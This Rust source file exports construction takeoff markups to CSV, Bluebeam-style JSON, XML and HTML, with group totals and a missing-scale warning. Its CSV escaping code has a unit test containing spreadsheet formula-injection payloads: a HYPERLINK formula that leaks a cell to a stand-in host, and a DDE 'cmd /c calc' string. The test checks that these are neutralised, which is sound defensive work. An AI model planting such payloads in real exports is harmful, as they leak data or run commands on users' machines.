//! A takeoff, written out: CSV, JSON, XML and HTML, grouped the way the
//! markups list is grouped.
//!
//! One listing, several shapes. Every export is made from the same lines,
//! the same columns and the same grouping as the list on screen, so a number
//! in a spreadsheet can always be found again on the drawing.
//!
//! The JSON is shaped like Bluebeam's own markup list — `Markups`, each with
//! `Subject`, `Comment` and the custom columns under `ExtendedProperties` —
//! so anything that already reads a Bluebeam takeoff reads this one without
//! being changed. FabWire's importer is the one that matters.
//!
//! And every shape carries the warning with it. A takeoff that left markups
//! out for want of a scale says so, in the file, where the next person will
//! see it.

use std::collections::BTreeMap;

use serde_json::{json, Value};

use crate::user::{self, UserColumn};
use crate::{Column, Row, WeightColumns};

/// How the list is grouped.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash)]
pub enum GroupBy {
    Nothing,
    Subject,
    Sheet,
    Label,
    Kind,
    Author,
    Status,
    Colour,
    Drawing,
}

impl GroupBy {
    pub const ALL: &'static [GroupBy] = &[
        GroupBy::Subject,
        GroupBy::Sheet,
        GroupBy::Label,
        GroupBy::Kind,
        GroupBy::Author,
        GroupBy::Status,
        GroupBy::Colour,
        GroupBy::Drawing,
        GroupBy::Nothing,
    ];

    pub fn name(self) -> &'static str {
        match self {
            GroupBy::Nothing => "Nothing",
            GroupBy::Subject => "Subject",
            GroupBy::Sheet => "Sheet",
            GroupBy::Label => "Label",
            GroupBy::Kind => "Type",
            GroupBy::Author => "Author",
            GroupBy::Status => "Status",
            GroupBy::Colour => "Colour",
            GroupBy::Drawing => "Drawing",
        }
    }

    pub fn key(self, line: &Line) -> String {
        let row = line.row;
        let or_none = |s: &str| {
            if s.trim().is_empty() {
                "(none)".to_string()
            } else {
                s.trim().to_string()
            }
        };
        match self {
            GroupBy::Nothing => String::new(),
            GroupBy::Subject => or_none(&row.subject),
            GroupBy::Sheet => or_none(&line.sheet),
            GroupBy::Label => or_none(&row.label),
            GroupBy::Kind => row.kind.name().to_string(),
            GroupBy::Author => or_none(&row.author),
            GroupBy::Status => or_none(&row.status),
            GroupBy::Colour => Column::Colour.text(row, WeightColumns::default()),
            GroupBy::Drawing => or_none(&line.drawing),
        }
    }
}

/// One markup in the listing, with where it is.
#[derive(Clone, Debug)]
pub struct Line<'a> {
    pub row: &'a Row,
    /// The sheet's own number, "S-101", not its page index.
    pub sheet: String,
    /// The file it is in.
    pub drawing: String,
}

/// What a group adds up to.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct Totals {
    pub key: String,
    /// Positions in the listing's lines.
    pub lines: Vec<usize>,
    pub markups: usize,
    /// What count markups counted.
    pub count: f64,
    pub length: f64,
    pub area: f64,
    pub volume: f64,
    pub pounds: f64,
    /// Any line here carried a weight.
    pub weighed: bool,
    /// Lines left out of the quantities for want of a scale.
    pub unscaled: usize,
    /// The unit lengths are in, from the first line that says.
    pub unit: String,
}

impl Totals {
    pub fn tons(&self) -> f64 {
        self.pounds / 2000.0
    }

    fn add(&mut self, at: usize, row: &Row, weights: WeightColumns) {
        self.lines.push(at);
        self.markups += 1;
        if self.unit.is_empty() && !row.unit.is_empty() {
            self.unit = row.unit.clone();
        }
        let q = row.quantity;
        if row.kind == annot::Kind::Count {
            self.count += row.count * q;
        }
        if !row.kind.measures() || row.kind == annot::Kind::Count {
            return;
        }
        if !row.scaled {
            self.unscaled += 1;
            return;
        }
        self.length += row.length.unwrap_or(0.0) * q;
        self.area += row.area.unwrap_or(0.0) * q;
        self.volume += row.volume.unwrap_or(0.0) * q;
        if let Some(lb) = row.pounds(weights) {
            self.pounds += lb;
            self.weighed = true;
        }
    }
}

/// Everything an export needs.
#[derive(Clone, Debug)]
pub struct Listing<'a> {
    /// What this is a takeoff of: a drawing's name, or a job's.
    pub title: String,
    pub who: String,
    pub when: String,
    pub columns: Vec<Column>,
    pub user: Vec<UserColumn>,
    pub weights: WeightColumns,
    pub lines: Vec<Line<'a>>,
    pub group: GroupBy,
}

impl<'a> Listing<'a> {
    pub fn heading(&self, column: Column) -> String {
        match column {
            Column::UserDefined(n) => user::name_of(&self.user, n as usize),
            Column::Page => "Sheet".into(),
            other => other.heading(),
        }
    }

    pub fn cell(&self, line: &Line, column: Column) -> String {
        match column {
            Column::Page => line.sheet.clone(),
            Column::UserDefined(n) => user::text(line.row, &self.user, n as usize),
            other => other.text(line.row, self.weights),
        }
    }

    /// The cell as a number, when it is one: lengths in the drawing's own
    /// unit, areas in its square unit. For a spreadsheet that can add up.
    pub fn number(&self, line: &Line, column: Column) -> Option<f64> {
        match column {
            Column::UserDefined(n) => user::value(line.row, &self.user, n as usize),
            Column::Page | Column::PageIndex => None,
            other if other.numeric() => {
                if !line.row.scaled && !matches!(other, Column::Count | Column::Quantity) {
                    return None;
                }
                other.number(line.row, self.weights)
            }
            _ => None,
        }
    }

    /// The groups, in order, each with its totals. One group holding every
    /// line when the listing is not grouped.
    pub fn groups(&self) -> Vec<Totals> {
        let mut map: BTreeMap<String, Totals> = BTreeMap::new();
        for (at, line) in self.lines.iter().enumerate() {
            let key = self.group.key(line);
            map.entry(key.clone())
                .or_insert_with(|| Totals {
                    key,
                    ..Totals::default()
                })
                .add(at, line.row, self.weights);
        }
        map.into_values().collect()
    }

    pub fn totals(&self) -> Totals {
        let mut all = Totals {
            key: "TOTAL".into(),
            ..Totals::default()
        };
        for (at, line) in self.lines.iter().enumerate() {
            all.add(at, line.row, self.weights);
        }
        all
    }

    /// The sentence every export carries when the takeoff is short.
    pub fn warning(&self) -> Option<String> {
        let short = self.totals().unscaled;
        (short > 0).then(|| {
            format!(
                "{short} measurement{} left out of every total because {} on a sheet with no \
                 scale. These totals are SHORT by that much.",
                if short == 1 { " is" } else { "s are" },
                if short == 1 { "it is" } else { "they are" }
            )
        })
    }

    /// Lines in the order the groups put them.
    pub fn ordered(&self) -> Vec<(Totals, Vec<&Line<'a>>)> {
        self.groups()
            .into_iter()
            .map(|g| {
                let lines = g.lines.iter().map(|at| &self.lines[*at]).collect();
                (g, lines)
            })
            .collect()
    }

    fn grouped(&self) -> bool {
        self.group != GroupBy::Nothing
    }

    // ---- CSV ---------------------------------------------------------------

    pub fn to_csv(&self) -> String {
        let mut out = String::new();
        if let Some(warning) = self.warning() {
            out.push_str(&csv_line(&[format!("WARNING: {warning}")]));
        }
        let mut headings: Vec<String> = Vec::new();
        if self.grouped() {
            headings.push(self.group.name().to_string());
        }
        headings.extend(self.columns.iter().map(|c| self.heading(*c)));
        out.push_str(&csv_line(&headings));
        for (group, lines) in self.ordered() {
            for line in lines {
                let mut cells: Vec<String> = Vec::new();
                if self.grouped() {
                    cells.push(group.key.clone());
                }
                cells.extend(self.columns.iter().map(|c| self.cell(line, *c)));
                out.push_str(&csv_line(&cells));
            }
        }
        out.push('\n');
        out.push_str(&csv_line(&self.total_headings()));
        for group in self.groups().into_iter().chain(std::iter::once(self.totals())) {
            out.push_str(&csv_line(&self.total_cells(&group)));
        }
        out
    }

    pub fn total_headings(&self) -> Vec<String> {
        vec![
            if self.grouped() { self.group.name().to_string() } else { "".into() },
            "Markups".into(),
            "Count".into(),
            "Length".into(),
            "Area".into(),
            "Volume".into(),
            "Pounds".into(),
            "Tons".into(),
            "Left out (no scale)".into(),
        ]
    }

    pub fn total_cells(&self, t: &Totals) -> Vec<String> {
        let unit = |u: &str, square: &str| {
            if u.is_empty() {
                String::new()
            } else {
                format!(" {u}{square}")
            }
        };
        vec![
            t.key.clone(),
            t.markups.to_string(),
            if t.count > 0.0 { format!("{:.0}", t.count) } else { String::new() },
            if t.length > 0.0 { format!("{:.2}{}", t.length, unit(&t.unit, "")) } else { String::new() },
            if t.area > 0.0 { format!("{:.2}{}", t.area, unit(&t.unit, "²")) } else { String::new() },
            if t.volume > 0.0 { format!("{:.2}{}", t.volume, unit(&t.unit, "³")) } else { String::new() },
            if t.weighed { format!("{:.0}", t.pounds) } else { String::new() },
            if t.weighed { format!("{:.3}", t.tons()) } else { String::new() },
            if t.unscaled > 0 { t.unscaled.to_string() } else { String::new() },
        ]
    }

    // ---- JSON, shaped like Bluebeam's markup list --------------------------

    pub fn to_json(&self) -> Value {
        let markups: Vec<Value> = self
            .lines
            .iter()
            .map(|line| bluebeam_markup(line, &self.user, self.weights))
            .collect();
        let group = |t: &Totals| {
            json!({
                "Key": t.key,
                "Markups": t.markups,
                "Count": t.count,
                "Length": t.length,
                "Area": t.area,
                "Volume": t.volume,
                "Pounds": t.weighed.then_some(t.pounds),
                "Tons": t.weighed.then_some(t.tons()),
                "LeftOutNoScale": t.unscaled,
                "Unit": t.unit,
            })
        };
        json!({
            "Title": self.title,
            "ExportedBy": self.who,
            "Exported": self.when,
            "Source": "Excalibur View",
            "GroupedBy": self.group.name(),
            "Warning": self.warning(),
            "Markups": markups,
            "Groups": self.groups().iter().map(group).collect::<Vec<_>>(),
            "Totals": group(&self.totals()),
        })
    }

    // ---- XML -----------------------------------------------------------------

    pub fn to_xml(&self) -> String {
        let mut out = String::from("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        out.push_str(&format!(
            "<MarkupSummary Title=\"{}\" Exported=\"{}\" ExportedBy=\"{}\" Source=\"Excalibur View\" GroupedBy=\"{}\">\n",
            xml(&self.title),
            xml(&self.when),
            xml(&self.who),
            self.group.name()
        ));
        if let Some(warning) = self.warning() {
            out.push_str(&format!("  <Warning>{}</Warning>\n", xml(&warning)));
        }
        for (group, lines) in self.ordered() {
            out.push_str(&format!("  <Group Name=\"{}\">\n", xml(&group.key)));
            for line in lines {
                out.push_str("    <Markup>\n");
                for column in &self.columns {
                    let text = self.cell(line, *column);
                    if text.is_empty() {
                        continue;
                    }
                    let tag = element(&self.heading(*column));
                    out.push_str(&format!("      <{tag}>{}</{tag}>\n", xml(&text)));
                }
                out.push_str("    </Markup>\n");
            }
            out.push_str(&totals_xml(&group, "    "));
            out.push_str("  </Group>\n");
        }
        out.push_str(&totals_xml(&self.totals(), "  "));
        out.push_str("</MarkupSummary>\n");
        out
    }

    // ---- HTML ----------------------------------------------------------------

    pub fn to_html(&self) -> String {
        let mut out = String::new();
        out.push_str("<!doctype html>\n<html><head><meta charset=\"utf-8\">");
        out.push_str(&format!("<title>{} — takeoff</title>", html(&self.title)));
        out.push_str(
            "<style>body{font:13px/1.4 Segoe UI,Arial,sans-serif;margin:24px;color:#111}\
             h1{font-size:20px;margin:0 0 4px}.meta{color:#555;margin-bottom:14px}\
             .warn{background:#fff3cd;border:1px solid #e0b400;padding:8px 10px;margin:10px 0;font-weight:600}\
             table{border-collapse:collapse;width:100%;margin:0 0 18px}\
             th,td{border-bottom:1px solid #ddd;padding:4px 8px;text-align:left;white-space:nowrap}\
             th{background:#f2f4f7}td.n{text-align:right;font-variant-numeric:tabular-nums}\
             tr.g td{background:#e8eef7;font-weight:600}tr.t td{font-weight:700;border-top:2px solid #333}\
             @media print{body{margin:0}}</style></head><body>",
        );
        out.push_str(&format!("<h1>{}</h1>", html(&self.title)));
        out.push_str(&format!(
            "<div class=\"meta\">{} markups · exported {} by {} · grouped by {} · Excalibur View</div>",
            self.lines.len(),
            html(&self.when),
            html(&self.who),
            self.group.name()
        ));
        if let Some(warning) = self.warning() {
            out.push_str(&format!("<div class=\"warn\">{}</div>", html(&warning)));
        }
        // The summary first: it is the number people are after.
        out.push_str("<table><tr>");
        for heading in self.total_headings() {
            out.push_str(&format!("<th>{}</th>", html(&heading)));
        }
        out.push_str("</tr>");
        for group in self.groups() {
            out.push_str("<tr>");
            for (i, cell) in self.total_cells(&group).iter().enumerate() {
                out.push_str(&format!("<td{}>{}</td>", if i > 0 { " class=\"n\"" } else { "" }, html(cell)));
            }
            out.push_str("</tr>");
        }
        out.push_str("<tr class=\"t\">");
        for (i, cell) in self.total_cells(&self.totals()).iter().enumerate() {
            out.push_str(&format!("<td{}>{}</td>", if i > 0 { " class=\"n\"" } else { "" }, html(cell)));
        }
        out.push_str("</tr></table>");
        // Then every markup, under its group.
        out.push_str("<table><tr>");
        for column in &self.columns {
            out.push_str(&format!("<th>{}</th>", html(&self.heading(*column))));
        }
        out.push_str("</tr>");
        for (group, lines) in self.ordered() {
            if self.grouped() {
                out.push_str(&format!(
                    "<tr class=\"g\"><td colspan=\"{}\">{} — {} markup{}</td></tr>",
                    self.columns.len().max(1),
                    html(&group.key),
                    group.markups,
                    if group.markups == 1 { "" } else { "s" }
                ));
            }
            for line in lines {
                out.push_str("<tr>");
                for column in &self.columns {
                    let numeric = column.numeric() || matches!(column, Column::UserDefined(_));
                    out.push_str(&format!(
                        "<td{}>{}</td>",
                        if numeric { " class=\"n\"" } else { "" },
                        html(&self.cell(line, *column))
                    ));
                }
                out.push_str("</tr>");
            }
        }
        out.push_str("</table></body></html>\n");
        out
    }
}

/// One markup the way Bluebeam's markup list hands it over: the fields its
/// consumers read, the custom columns by name under `ExtendedProperties`, and
/// the measurement as text in `Comment`, which is where Revu puts it.
pub fn bluebeam_markup(line: &Line, user: &[UserColumn], weights: WeightColumns) -> Value {
    let row = line.row;
    let mut extended = serde_json::Map::new();
    for index in 0..6 {
        let text = user::text(row, user, index);
        if !text.trim().is_empty() {
            extended.insert(user::name_of(user, index), Value::String(text));
        }
    }
    let mut comment = if row.kind.measures() && !row.caption.is_empty() {
        row.caption.clone()
    } else {
        row.comments.clone()
    };
    // A markup standing for several: said the way a Bluebeam importer counts
    // it. A length gets its length and how many as columns, which importers
    // prefer to the caption; a count says the whole count.
    if row.quantity != 1.0 {
        match row.kind {
            annot::Kind::Length | annot::Kind::Polylength if row.scaled => {
                if let Some(feet) = row.length {
                    extended.insert("Length".into(), Value::String(format!("{feet:.4}")));
                    extended.insert("Qty".into(), Value::String(format!("{}", row.quantity)));
                }
            }
            annot::Kind::Count => comment = format!("{}", row.count * row.quantity),
            _ => {}
        }
    }
    let scaled_number = |v: Option<f64>| if row.scaled { v } else { None };
    json!({
        "Id": format!("{}-{}", row.page + 1, row.reference.number),
        "Subject": row.subject,
        "Label": row.label,
        "Comment": comment,
        "Comments": row.comments,
        "Author": row.author,
        "Date": Column::Date.text(row, weights),
        "CreationDate": Column::CreationDate.text(row, weights),
        "Status": row.status,
        "Color": Column::Colour.text(row, weights),
        "Type": if row.kind.measures() { format!("{} Measurement", row.kind.name()) } else { "Markup".into() },
        "Page": row.page + 1,
        "PageIndex": row.page,
        "PageLabel": line.sheet,
        "File": line.drawing,
        "Measurement": row.caption,
        "Units": row.unit,
        "Scaled": row.scaled,
        "Count": row.count,
        "Quantity": row.quantity,
        "Length": scaled_number(row.length),
        "Area": scaled_number(row.area),
        "Volume": scaled_number(row.volume),
        "Pounds": row.pounds(weights),
        "Tons": row.tons(weights),
        "Grid": row.grid,
        "ExtendedProperties": Value::Object(extended),
    })
}

fn totals_xml(t: &Totals, indent: &str) -> String {
    let mut out = format!("{indent}<Totals Name=\"{}\" Markups=\"{}\"", xml(&t.key), t.markups);
    if t.count > 0.0 {
        out.push_str(&format!(" Count=\"{:.0}\"", t.count));
    }
    if t.length > 0.0 {
        out.push_str(&format!(" Length=\"{:.2}\"", t.length));
    }
    if t.area > 0.0 {
        out.push_str(&format!(" Area=\"{:.2}\"", t.area));
    }
    if t.volume > 0.0 {
        out.push_str(&format!(" Volume=\"{:.2}\"", t.volume));
    }
    if t.weighed {
        out.push_str(&format!(" Pounds=\"{:.0}\" Tons=\"{:.3}\"", t.pounds, t.tons()));
    }
    if t.unscaled > 0 {
        out.push_str(&format!(" LeftOutNoScale=\"{}\"", t.unscaled));
    }
    if !t.unit.is_empty() {
        out.push_str(&format!(" Unit=\"{}\"", xml(&t.unit)));
    }
    out.push_str("/>\n");
    out
}

/// One spreadsheet cell, written so a spreadsheet reads it as the text or
/// number it is: quoted when it holds a comma, a quote or a line break, and
/// with a `'` in front when it starts the way a formula does (`=`, `+`, `-`,
/// `@`, a tab or a carriage return) and is not simply a number. A markup's
/// subject, label or comment is whatever somebody typed; `=HYPERLINK(...)`
/// opened in Excel by an estimator is that somebody's formula running there.
pub fn csv_cell(text: &str) -> String {
    let formula = text.starts_with(['=', '+', '-', '@', '\t', '\r']) && text.trim().parse::<f64>().is_err(); // WHAT: starts like a formula and is not a plain number. WHY: `-12.5` stays a number; `-1+cmd|...` does not.
    let text = if formula { format!("'{text}") } else { text.to_string() }; // WHAT: a quote mark in front. WHY: a spreadsheet then reads it as text.
    if text.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", text.replace('"', "\"\"")) // WHAT: quoted, quotes doubled. WHY: one cell, whatever is in it.
    } else {
        text // WHAT: as it is. WHY: nothing in it needs quoting.
    }
}

fn csv_line(cells: &[String]) -> String {
    let mut out = cells
        .iter()
        .map(|c| csv_cell(c)) // WHAT: each cell written safely. WHY: see `csv_cell`.
        .collect::<Vec<_>>()
        .join(",");
    out.push('\n');
    out
}

fn xml(text: &str) -> String {
    text.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

fn html(text: &str) -> String {
    xml(text)
}

/// A column heading as an XML element name: "LBS Per FT" is `LBS_Per_FT`.
fn element(heading: &str) -> String {
    let mut out: String = heading
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect();
    while out.contains("__") {
        out = out.replace("__", "_");
    }
    let out = out.trim_matches('_').to_string();
    if out.is_empty() || out.starts_with(|c: char| c.is_ascii_digit()) {
        format!("C_{out}")
    } else {
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const WEIGHTS: WeightColumns = WeightColumns {
        per_length: 0,
        per_area: 5,
    };

    fn beam(subject: &str, page: usize, feet: f64, plf: &str, scaled: bool) -> Row {
        let mut row = Row::blank();
        row.kind = annot::Kind::Length;
        row.page = page;
        row.subject = subject.into();
        row.length = Some(feet);
        row.scaled = scaled;
        row.count = 1.0;
        row.unit = "ft".into();
        row.caption = format!("{feet}'-0\"");
        row.columns[0] = plf.into();
        row
    }

    fn listing<'a>(rows: &'a [Row], group: GroupBy) -> Listing<'a> {
        Listing {
            title: "S-101.pdf".into(),
            who: "Jordan".into(),
            when: "2026-09-21 16:40".into(),
            columns: vec![Column::Page, Column::Subject, Column::Length, Column::UserDefined(0), Column::Pounds],
            user: vec![UserColumn::plain(0, "LBS Per FT")],
            weights: WEIGHTS,
            lines: rows
                .iter()
                .map(|row| Line {
                    row,
                    sheet: format!("S-10{}", row.page + 1),
                    drawing: "S-101.pdf".into(),
                })
                .collect(),
            group,
        }
    }

    #[test]
    fn groups_total_what_is_in_them() {
        let rows = vec![
            beam("W12x26", 0, 20.0, "26", true),
            beam("W12x26", 1, 10.0, "26", true),
            beam("W16x31", 0, 30.0, "31", true),
        ];
        let list = listing(&rows, GroupBy::Subject);
        let groups = list.groups();
        assert_eq!(groups.len(), 2);
        assert_eq!(groups[0].key, "W12x26");
        assert_eq!(groups[0].length, 30.0);
        assert_eq!(groups[0].pounds, 780.0);
        assert_eq!(list.totals().pounds, 780.0 + 930.0);
        assert!(list.warning().is_none());
    }

    #[test]
    fn every_export_says_when_it_is_short() {
        let rows = vec![beam("W12x26", 0, 20.0, "26", true), beam("W12x26", 1, 10.0, "26", false)];
        let list = listing(&rows, GroupBy::Sheet);
        assert_eq!(list.totals().unscaled, 1);
        assert_eq!(list.totals().pounds, 520.0);
        assert!(list.to_csv().starts_with("WARNING:"));
        assert!(list.to_xml().contains("<Warning>"));
        assert!(list.to_html().contains("SHORT"));
        assert!(list.to_json()["Warning"].as_str().unwrap().contains("SHORT"));
    }

    #[test]
    fn the_json_reads_like_a_bluebeam_markup_list() {
        let rows = vec![beam("W12x26", 0, 24.5, "26.00", true)];
        let list = listing(&rows, GroupBy::Nothing);
        let json = list.to_json();
        let first = &json["Markups"][0];
        assert_eq!(first["Subject"], "W12x26");
        assert_eq!(first["Comment"], "24.5'-0\"");
        assert_eq!(first["ExtendedProperties"]["LBS Per FT"], "26.00");
        assert_eq!(first["PageLabel"], "S-101");
    }

    #[test]
    fn csv_quotes_what_needs_quoting_and_totals_at_the_foot() {
        let rows = vec![beam("Beam, \"typ\"", 0, 20.0, "26", true)];
        let csv = listing(&rows, GroupBy::Subject).to_csv();
        assert!(csv.contains("\"Beam, \"\"typ\"\"\""), "{csv}");
        assert!(csv.contains("TOTAL"), "{csv}");
    }

    #[test]
    fn a_cell_a_spreadsheet_would_run_is_written_as_text() {
        for (typed, written) in [
            ("=HYPERLINK(\"http://x.test/\"&A1)", "\"'=HYPERLINK(\"\"http://x.test/\"\"&A1)\""),
            ("+cmd|' /c calc'!A0", "'+cmd|' /c calc'!A0"),
            ("-1+1", "'-1+1"),
            ("@SUM(A1:A9)", "'@SUM(A1:A9)"),
            ("\t=1", "'\t=1"),
        ] {
            assert_eq!(csv_cell(typed), written, "{typed:?}"); // WHAT: a formula written as text. WHY: before, a markup's comment ran as a formula in the estimator's spreadsheet.
        }
        assert_eq!(csv_cell("-12.5"), "-12.5", "a negative number stays a number");
        assert_eq!(csv_cell("W12x26"), "W12x26", "an ordinary cell is left alone");
        let rows = vec![beam("=1+1", 0, 20.0, "26", true)]; // WHAT: a subject somebody typed as a formula. WHY: what a takeoff listing writes out.
        assert!(listing(&rows, GroupBy::Subject).to_csv().contains("'=1+1"), "the listing's CSV writes it as text");
    }

    #[test]
    fn xml_element_names_are_legal() {
        assert_eq!(element("LBS Per FT"), "LBS_Per_FT");
        assert_eq!(element("TTL Length (LBS)"), "TTL_Length_LBS");
        assert_eq!(element("3D"), "C_3D");
    }
}
